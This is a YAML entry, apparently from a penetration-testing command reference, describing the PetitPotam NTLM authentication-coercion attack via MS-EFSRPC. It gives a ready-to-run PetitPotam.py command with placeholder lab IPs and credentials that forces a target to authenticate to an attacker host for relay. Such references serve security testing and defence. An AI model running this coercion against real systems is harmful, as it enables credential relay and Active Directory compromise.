---
description: |
  PetitPotam leverages the MS-EFSRPC API to connect to a Windows host, hijack the authentication session, and trigger an authentication from the target host to an attacker controlled host (usually SMB or HTTP server). This captured authentication can then be relayed to authenticate to other hosts and perform more attacks. See more in ntlmrelayx.py.

  Command Reference:

  	Target IP: 10.10.10.1

  	Attacker IP: 10.10.10.2

  	Domain: test.local

  	Username: john

  	Password: password123

command: |
  python3 PetitPotam.py -d test.local -u john -p password123 10.10.10.2 10.10.10.1
items:
  - Password
  - Username
services:
  - RPC
  - NTLM
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/topotam/PetitPotam
  - https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory
---
